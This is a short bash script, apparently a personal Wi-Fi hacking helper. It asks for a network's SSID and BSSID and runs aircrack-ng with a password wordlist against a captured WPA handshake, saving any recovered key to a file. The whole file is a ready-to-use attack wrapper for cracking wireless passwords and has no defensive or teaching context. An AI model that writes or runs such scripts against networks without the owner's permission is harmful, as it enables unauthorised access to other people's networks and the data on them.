#!/bin/bash
word1=/home/wordlist/password.txt
word2=/home/wordlist/rockyou.txt
dir=/home/script/wifi_hacking/capture
cap=cap-wpa-01.cap
key=keyfound.txt
figlet "wifi crack"
echo "aircrack-ng -w $(tput setaf 2)/path/to/dictionary-file.txt $(tput setaf 7)-b $(tput setaf 1)(bssid) $(tput setaf 2)/path/to/cap/file.cap"
echo "$(tput setaf 7)---------------------" 
echo "Enter SSID :"
read ssid
echo "Enter BSSID :"
read bssid
cap_path=$dir/$ssid/$cap
aircrack-ng -w $word1 -b $bssid $cap_path
echo "aircrack-ng -w $word1 -b $bssid $cap_path"
aircrack-ng -w $word1 -b $bssid $cap_path > $dir/$ssid/$key
